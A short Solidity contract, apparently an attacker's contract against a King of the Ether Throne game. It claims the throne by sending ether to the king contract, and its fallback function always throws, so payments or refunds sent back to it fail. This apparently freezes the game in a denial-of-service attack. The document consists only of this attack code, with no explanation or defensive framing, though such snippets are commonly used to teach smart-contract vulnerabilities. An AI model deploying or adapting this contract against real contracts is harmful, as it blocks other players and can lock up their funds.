contract KotETMallory {

  function unseatKing(address king, uint w){
    bool res = king.call.value(w)();
  }

  function() payable {
    throw;
  }
}